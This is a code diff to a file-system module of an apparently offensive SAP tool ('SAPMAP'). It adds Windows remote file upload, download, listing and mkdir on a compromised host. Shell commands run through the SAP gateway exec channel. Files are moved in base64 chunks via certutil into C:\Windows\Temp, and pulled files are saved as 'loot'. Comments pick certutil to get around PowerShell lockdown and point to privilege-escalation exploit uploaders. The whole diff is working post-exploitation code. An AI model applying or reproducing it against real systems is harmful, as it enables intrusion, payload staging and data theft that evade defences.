@@ -41,8 +41,9 @@ Design goals:
 
 5. **Cross-OS.**  ``os_family`` is detected from ``node.os_type`` at
    construction; each operation dispatches to Linux or Windows
-   variants.  Phase 1 ships Linux fully implemented; Windows raises
-   ``NotImplementedError`` with a clear message and lands in Phase 2.
+   variants.  Both are fully implemented.  Windows uses cmd.exe
+   for the listing / directory calls and ``certutil -encode/-decode``
+   for chunked base64 file transfer.
 
 6. **No exceptions on target errors.**  Returns
    ``{ok: bool, ...}`` dicts throughout — matches the rest of the
@@ -250,12 +251,12 @@ class TargetFS:
         md5_local = hashlib.md5(content).hexdigest()
 
         if self.os_family == "windows":
-            return {"ok": False, "error": "Windows upload not yet "
-                     "implemented — Phase 2 of issue #37"}
-
-        # Linux path: chunked b64 write via python3 + b64decode + verify
-        result = self._upload_linux(remote_path, content,
-                                      progress_cb=progress_cb)
+            result = self._upload_windows(remote_path, content,
+                                            progress_cb=progress_cb)
+        else:
+            # Linux path: chunked b64 write via python3 + b64decode + verify
+            result = self._upload_linux(remote_path, content,
+                                          progress_cb=progress_cb)
         result["bytes"] = len(content)
         result["md5_local"] = md5_local
         result["elapsed"] = round(time.time() - t0, 2)
@@ -272,7 +273,10 @@ class TargetFS:
                 progress_cb(len(content), len(content), "verify")
             except Exception:
                 pass
-        md5_remote = self._remote_md5_linux(remote_path)
+        if self.os_family == "windows":
+            md5_remote = self._remote_md5_windows(remote_path)
+        else:
+            md5_remote = self._remote_md5_linux(remote_path)
         result["md5_remote"] = md5_remote
         if md5_remote and md5_remote != md5_local:
             result["ok"] = False
@@ -328,9 +332,11 @@ class TargetFS:
         """
         t0 = time.time()
 
-        if self.os_family == "windows":
-            return {"ok": False, "error": "Windows download not yet "
-                     "implemented — Phase 2 of issue #37"}
+        # Windows and Linux share the size-check + loot-write flow;
+        # only the actual byte-fetching differs.
+        _download_fn = (self._download_windows
+                        if self.os_family == "windows"
+                        else self._download_linux)
 
         # Pre-flight: file size
         size_info = self.stat(remote_path)
@@ -359,8 +365,8 @@ class TargetFS:
                      "elapsed": round(time.time() - t0, 2)}
 
         # Chunked base64 read
-        content = self._download_linux(remote_path, size,
-                                         progress_cb=progress_cb)
+        content = _download_fn(remote_path, size,
+                                progress_cb=progress_cb)
         if content is None:
             return {"ok": False, "error":
                      "chunked read failed — see console output"}
@@ -391,9 +397,7 @@ class TargetFS:
             }
         """
         if self.os_family == "windows":
-            return {"ok": False, "error": "Windows list_dir not yet "
-                     "implemented — Phase 2 of issue #37",
-                     "path": remote_path, "entries": []}
+            return self._list_dir_windows(remote_path)
         return self._list_dir_linux(remote_path)
 
     def stat(self, remote_path: str) -> dict:
@@ -413,9 +417,7 @@ class TargetFS:
         readback worked, file just isn't there).
         """
         if self.os_family == "windows":
-            return {"ok": False, "error": "Windows stat not yet "
-                     "implemented — Phase 2 of issue #37",
-                     "exists": False}
+            return self._stat_windows(remote_path)
         return self._stat_linux(remote_path)
 
     def mkdir(self, remote_path: str, parents: bool = True) -> dict:
@@ -424,8 +426,7 @@ class TargetFS:
             {ok: bool, error: str}
         """
         if self.os_family == "windows":
-            return {"ok": False, "error": "Windows mkdir not yet "
-                     "implemented — Phase 2 of issue #37"}
+            return self._mkdir_windows(remote_path)
         args = f"-p {remote_path}" if parents else remote_path
         r = self.exec_fn("/bin/mkdir", args)
         if r.get("success"):
@@ -1075,6 +1076,299 @@ class TargetFS:
                           "P3/P4 stdout capture on this kernel"}
 
     # ------------------------------------------------------------------
+    # Windows implementations
+    # ------------------------------------------------------------------
+    #
+    # Design: use ``cmd.exe /C ...`` for every call so the exec channel
+    # (GW SAPXPG or SXPG) sees a single argv0 with the whole command
+    # line stuffed into PARAMS.  Same shape the OS terminal and every
+    # other Windows-target module in SAPMAP uses.
+    #
+    # Byte transport uses certutil, which is present on every supported
+    # Windows Server SKU (2012+) and doesn't require PowerShell — some
+    # hardened hosts have PS locked down under Constrained Language Mode
+    # or WDAC, but certutil is a Microsoft-signed binary in system32 and
+    # is almost never blocked.
+    #
+    # ``certutil -encode <file> <tmp>`` produces a PEM-wrapped base64
+    # file (76-char lines) — pretty-close to Linux ``base64``'s output
+    # so ``_decode_certutil_b64`` unwraps it the same way.
+    #
+    # ``certutil -decode <tmp> <file>`` is the reverse operation.
+
+    # cmd.exe PARAMS budget for a single call.  The SAPXPG PARAMS field
+    # caps at 255 bytes; ``/C `` prefix + 200 chars of base64 payload
+    # + a small tail (``>>"path"``) still fits under 255.
+    _WIN_CHUNK_B64_CHARS = 120
+
+    _WIN_TMP_DIR = "C:\\Windows\\Temp"
+
+    def _win_tmp(self, suffix: str) -> str:
+        """Compose a random-suffixed temp path in the target's
+        ``%SYSTEMROOT%\\Temp``.  SAPXPG runs under a service account
+        with reliable write access there on every kernel SAPMAP has
+        seen in the field."""
+        import random as _r
+        import string as _s
+        tag = "".join(_r.choice(_s.ascii_lowercase) for _ in range(8))
+        return f"{self._WIN_TMP_DIR}\\sapmap_{tag}{suffix}"
+
+    def _win_cmd(self, tail: str) -> dict:
+        """Run ``cmd.exe /C <tail>``.  ``tail`` must be a single
+        command line — no argv splitting.  Returns the raw exec_fn
+        dict so callers can inspect ``output`` / ``error`` /
+        ``success`` themselves."""
+        return self.exec_fn("cmd.exe", f"/C {tail}")
+
+    def _upload_windows(self, remote_path: str, content: bytes,
+                          progress_cb: "Optional[Callable[[int,int,str],None]]" = None
+                          ) -> dict:
+        """Upload via chunked ``cmd.exe /C echo <b64> >> file`` +
+        ``certutil -decode``.  Same recipe as the existing GodPotato /
+        MiniPlasma / EfsPotato uploaders — kept private here so this
+        module remains standalone.
+        """
+        b64 = base64.b64encode(content).decode("ascii")
+        chunk_size = self._WIN_CHUNK_B64_CHARS
+        chunks = [b64[i:i + chunk_size]
+                   for i in range(0, len(b64), chunk_size)]
+        total_bytes = len(content)
+        tmp_b64 = self._win_tmp(".b64")
+
+        # Wipe stale files at the target path AND our tmp b64 file.
+        self._win_cmd(f'del /q /f "{remote_path}" "{tmp_b64}" 2>nul')
+
+        def _emit(done: int, phase: str) -> None:
+            if progress_cb:
+                try:
+                    progress_cb(done, total_bytes, phase)
+                except Exception:
+                    pass
+
+        _emit(0, "chunked")
+        for i, chunk in enumerate(chunks):
+            op = ">" if i == 0 else ">>"
+            r = self._win_cmd(f'echo {chunk}{op}"{tmp_b64}"')
+            if not r.get("success"):
+                self._win_cmd(f'del /q /f "{tmp_b64}" 2>nul')
+                return {"ok": False,
+                         "error": (f"chunk {i + 1}/{len(chunks)} "
+                                   f"failed at exec: "
+                                   f"{r.get('error', '?')}"),
+                         "chunks": i, "chunk_size": chunk_size}
+            done_est = min(total_bytes,
+                            ((i + 1) * total_bytes) // len(chunks))
+            _emit(done_est, "chunked")
+
+        # certutil -decode: b64 → target path
+        r = self._win_cmd(
+            f'certutil -decode "{tmp_b64}" "{remote_path}" >nul')
+        # certutil returns 0 on success; on failure it prints
+        # "CertUtil: -decode command FAILED: 0x<hex>" to stdout.
+        out_joined = " ".join(r.get("output", [])).lower()
+        if not r.get("success") or "failed" in out_joined:
+            self._win_cmd(f'del /q /f "{tmp_b64}" 2>nul')
+            return {"ok": False,
+                     "error": (f"certutil -decode failed: "
+                               f"{' '.join(r.get('output', []))[:200]}"),
+                     "chunks": len(chunks), "chunk_size": chunk_size}
+
+        # Cleanup
+        self._win_cmd(f'del /q /f "{tmp_b64}" 2>nul')
+        return {"ok": True, "error": "",
+                 "chunks": len(chunks), "chunk_size": chunk_size}
+
+    def _remote_md5_windows(self, remote_path: str) -> str:
+        """MD5 hex of ``remote_path`` via ``certutil -hashfile ... MD5``.
+        Returns empty string on any failure — same contract as the
+        Linux equivalent."""
+        r = self._win_cmd(
+            f'certutil -hashfile "{remote_path}" MD5')
+        for line in r.get("output", []):
+            s = line.strip().replace(" ", "").lower()
+            if len(s) == 32 and all(c in "0123456789abcdef" for c in s):
+                return s
+        return ""
+
+    def _download_windows(self, remote_path: str, size: int,
+                            progress_cb: "Optional[Callable[[int,int,str],None]]" = None
+                            ) -> Optional[bytes]:
+        """Fetch a file from the target via ``certutil -encode <path>
+        <tmp>`` + ``type <tmp>`` in a single cmd.exe call, then
+        strip the PEM wrapper and decode.
+
+        SAPXPG can silently truncate large stdout — same story as the
+        Linux GNU-base64 path.  If the decoded size doesn't match the
+        stat size, return None so the caller reports a clean failure.
+        (Chunked PowerShell fallback is possible but rarely needed —
+        the operator can always use SXPG once creds are minted.)
+        """
+        def _emit(done: int, phase: str) -> None:
+            if progress_cb:
+                try:
+                    progress_cb(done, size, phase)
+                except Exception:
+                    pass
+
+        _emit(0, "single_shot")
+        tmp = self._win_tmp(".b64")
+        # certutil writes the b64 to a temp file; `type` pipes it back
+        # via SAPXPG's stdout.  `& del` (not `&&`) so cleanup happens
+        # even if `type` returns non-zero.
+        r = self._win_cmd(
+            f'certutil -encode "{remote_path}" "{tmp}" >nul & '
+            f'type "{tmp}" & del /q /f "{tmp}"')
+        out_text = "\n".join(r.get("output", []))
+        decoded = _decode_certutil_b64(out_text)
+        if decoded is None:
+            print(f"[-] {self.label}: certutil -encode returned no "
+                  f"parseable base64 payload for {remote_path} — raw "
+                  f"output: {out_text[:200]!r}")
+            return None
+        if len(decoded) != size:
+            print(f"[-] {self.label}: certutil -encode returned "
+                  f"{len(decoded)} B, expected {size} — SAPXPG "
+                  f"probably truncated stdout on this large file.  "
+                  f"Try SXPG (create credentials + escalate first) "
+                  f"or grab the file in smaller chunks.")
+            return None
+        _emit(size, "single_shot")
+        return decoded
+
+    def _list_dir_windows(self, remote_path: str) -> dict:
+        """List a directory via ``dir /-C /A /Q``.
+
+        ``/-C`` = no thousands separator in Size (easier to parse).
+        ``/A``  = include hidden + system files.
+        ``/Q``  = include the file owner (harmless — we ignore it).
+
+        cmd's ``dir`` output format for each entry (space-separated):
+          <date> <time> <AM/PM?> <size|<DIR>> [owner] <name>
+
+        Special case: single-file target — ``dir <file>`` still works
+        and returns a single-entry listing; we route that through
+        stat first so the UI can offer a download button.
+        """
+        # Short-circuit for a file path so the operator can type
+        # C:\Windows\System32\drivers\etc\hosts and get a download link.
+        st = self._stat_windows(remote_path)
+        if st.get("ok") and st.get("exists") and not st.get("is_dir"):
+            basename = ntpath_basename(remote_path)
+            return {"ok": True, "path": remote_path,
+                     "entries": [{
+                        "name":   basename,
+                        "size":   st.get("size", 0),
+                        "is_dir": False,
+                        "mtime":  st.get("mtime", ""),
+                        "mode":   st.get("mode", ""),
+                        "abs_path": remote_path,
+                     }],
+                     "error": ""}
+
+        r = self._win_cmd(f'dir /-C /A "{remote_path}"')
+        lines = r.get("output", []) or []
+        if not lines:
+            return {"ok": False, "path": remote_path, "entries": [],
+                     "error": ("dir returned no output — SAPXPG may "
+                               "have dropped stdout, or the path "
+                               "doesn't exist")}
+        first_lo = lines[0].lower()
+        if "file not found" in first_lo or "path not found" in first_lo \
+                or "cannot find" in first_lo:
+            return {"ok": False, "path": remote_path, "entries": [],
+                     "error": lines[0].strip()}
+
+        entries = []
+        seen = set()
+        for line in lines:
+            entry = _parse_win_dir_line(line)
+            if not entry:
+                continue
+            key = (entry["name"], entry.get("size", -1))
+            if key in seen:
+                continue
+            seen.add(key)
+            entries.append(entry)
+        return {"ok": True, "path": remote_path,
+                 "entries": entries, "error": ""}
+
+    def _stat_windows(self, remote_path: str) -> dict:
+        """Get size / mtime / is_dir via ``dir /-C /A <path>``.
+
+        We reuse dir here (rather than PowerShell Get-Item) because
+        cmd is universally available and doesn't trip CLM/WDAC.
+        For a file, dir prints one entry line with the file's own
+        row; for a directory it prints a full listing — we detect
+        that case by looking at the summary line
+        (``N File(s)`` / ``N Dir(s)``) and reporting is_dir=True.
+        """
+        r = self._win_cmd(f'dir /-C /A "{remote_path}"')
+        lines = r.get("output", []) or []
+        if not lines:
+            return {"ok": False, "exists": False, "size": 0,
+                     "is_dir": False, "mtime": "", "mode": "",
+                     "error": "dir returned no output"}
+        joined_lo = "\n".join(lines).lower()
+        if "file not found" in joined_lo \
+                or "the system cannot find" in joined_lo \
+                or "path not found" in joined_lo:
+            return {"ok": True, "exists": False, "size": 0,
+                     "is_dir": False, "mtime": "", "mode": "",
+                     "error": ""}
+
+        basename = ntpath_basename(remote_path).lower()
+
+        # If any entry line names this basename OR carries <DIR>
+        # matching the parent dir, we have a hit.  Simpler heuristic:
+        # try to find an entry whose parsed name equals basename.
+        parent_entry = None
+        for line in lines:
+            e = _parse_win_dir_line(line)
+            if not e:
+                continue
+            if e["name"].lower() == basename:
+                parent_entry = e
+                break
+
+        # If the parent scan didn't find a same-named entry, the path
+        # is very likely a directory (its own listing).  Use the
+        # summary line as confirmation.
+        is_dir = False
+        for line in lines:
+            l = line.lower()
+            if " dir(s)" in l and " bytes free" in l:
+                is_dir = True
+                break
+
+        if parent_entry:
+            return {"ok": True, "exists": True,
+                     "size":   parent_entry.get("size", 0),
+                     "is_dir": parent_entry.get("is_dir", False),
+                     "mtime":  parent_entry.get("mtime", ""),
+                     "mode":   parent_entry.get("mode", ""),
+                     "error":  ""}
+        if is_dir:
+            return {"ok": True, "exists": True, "size": 0,
+                     "is_dir": True, "mtime": "", "mode": "",
+                     "error": ""}
+        return {"ok": False, "exists": False, "size": 0,
+                 "is_dir": False, "mtime": "", "mode": "",
+                 "error": "dir output unreadable — check exec channel"}
+
+    def _mkdir_windows(self, remote_path: str) -> dict:
+        """``mkdir <path>`` — cmd's mkdir creates intermediate dirs
+        automatically (equivalent to ``mkdir -p`` on Linux)."""
+        r = self._win_cmd(f'mkdir "{remote_path}"')
+        joined = " ".join(r.get("output", [])).lower()
+        if "already exists" in joined:
+            return {"ok": True, "error": ""}
+        if r.get("success") and "cannot find" not in joined:
+            return {"ok": True, "error": ""}
+        return {"ok": False,
+                 "error": " ".join(r.get("output", []))[:200]
+                          or r.get("error", "mkdir failed")}
+
+    # ------------------------------------------------------------------
     # Loot path helpers
     # ------------------------------------------------------------------
 
@@ -1171,6 +1465,135 @@ def _parse_ls_line(line: str) -> Optional[dict]:
         "is_dir": mode[0] == "d",
         "mtime":  mtime,
         "mode":   mode,
+    }
+
+
+# --------------------------------------------------------------------------
+# Windows helpers (module-level for unit-testability)
+# --------------------------------------------------------------------------
+
+def ntpath_basename(path: str) -> str:
+    """Split a Windows path on \\ or /.  Simpler than importing
+    ntpath — SAPMAP already tolerates mixed separators everywhere
+    (operators sometimes type C:/Windows/System32/... in the address
+    bar, sometimes C:\\Windows\\System32\\...)."""
+    p = path.rstrip("\\/")
+    for sep in ("\\", "/"):
+        idx = p.rfind(sep)
+        if idx >= 0:
+            p = p[idx + 1:]
+    return p
+
+
+# certutil -encode output shape:
+#   -----BEGIN CERTIFICATE-----
+#   <base64 lines wrapped at 64 chars>
+#   -----END CERTIFICATE-----
+#
+# Same helper lives in sapmap_miniplasma._decode_certutil_b64; ported
+# here so TargetFS remains standalone (no cross-module dependency on
+# an exploit helper that could be renamed).
+
+def _decode_certutil_b64(text: str) -> Optional[bytes]:
+    """Strip the PEM ``-----BEGIN/END CERTIFICATE-----`` wrappers
+    certutil emits and decode the inner base64.
+
+    Returns None when the input contains no BEGIN marker (certutil
+    printed an error or SAPXPG dropped the whole reply) or when the
+    inner payload is empty / malformed."""
+    if not text:
+        return None
+    payload_lines = []
+    in_payload = False
+    for ln in text.replace("\r", "").split("\n"):
+        if ln.startswith("-----BEGIN"):
+            in_payload = True
+            continue
+        if ln.startswith("-----END"):
+            in_payload = False
+            continue
+        if in_payload:
+            payload_lines.append(ln.strip())
+    payload = "".join(payload_lines)
+    if not payload:
+        return None
+    # Pad and lenient-decode — SAPXPG truncation can leave the tail
+    # short of a 4-char boundary.
+    payload += "=" * ((4 - len(payload) % 4) % 4)
+    try:
+        return base64.b64decode(payload, validate=False)
+    except Exception:
+        return None
+
+
+# `dir /-C /A <path>` output for a single entry, e.g.:
+#     08/20/2026  09:00 AM             1,234 hosts       (US locale, /C)
+#     08/20/2026  09:00 AM              1234 hosts       (US locale, /-C — no thousands)
+#     08/20/2026  09:00 AM    <DIR>          System32
+#     20/08/2026  09:00                 1234 hosts       (24h non-US locale)
+#     20.08.2026  09:00                 1234 hosts       (DE locale)
+#
+# Header/summary lines we want to skip:
+#     Volume in drive C is Windows
+#     Directory of C:\Windows\System32\drivers\etc
+#     42 File(s)      12345 bytes
+#      3 Dir(s)  99999999 bytes free
+#
+# We detect data rows by the leading date-token shape and split off
+# the date+time+size prefix from the trailing name (which can contain
+# spaces).  Owner column (from /Q) is ignored — we don't use it.
+
+_WIN_DATE_RE = re.compile(
+    r"^\s*(\d{1,2}[./-]\d{1,2}[./-]\d{2,4})\s+"        # date
+    r"(\d{1,2}:\d{2}(?::\d{2})?)"                        # time
+    r"(?:\s+([AP]M))?\s+"                                # optional AM/PM
+)
+
+
+def _parse_win_dir_line(line: str) -> Optional[dict]:
+    """Parse a single ``dir /-C /A`` data row into an entry dict.
+    Returns None on header/summary lines or unparseable input."""
+    s = line.rstrip()
+    if not s:
+        return None
+    m = _WIN_DATE_RE.match(s)
+    if not m:
+        return None
+    date_tok, time_tok, ampm = m.group(1), m.group(2), m.group(3)
+    rest = s[m.end():]
+    if not rest.strip():
+        return None
+
+    # Detect <DIR> marker.  It sits where the size number would.
+    is_dir = False
+    size = 0
+    tail = rest.lstrip()
+    if tail.startswith("<DIR>"):
+        is_dir = True
+        tail = tail[len("<DIR>"):].lstrip()
+    else:
+        # First whitespace-run separates size from name.
+        parts = tail.split(None, 1)
+        if not parts:
+            return None
+        size_tok = parts[0].replace(",", "").replace(".", "")
+        try:
+            size = int(size_tok)
+        except ValueError:
+            return None
+        tail = parts[1] if len(parts) > 1 else ""
+
+    name = tail.strip()
+    if not name or name in (".", ".."):
+        return None
+
+    mtime = f"{date_tok} {time_tok}" + (f" {ampm}" if ampm else "")
+    return {
+        "name":   name,
+        "size":   size,
+        "is_dir": is_dir,
+        "mtime":  mtime,
+        "mode":   "<DIR>" if is_dir else "",
     }
 
 
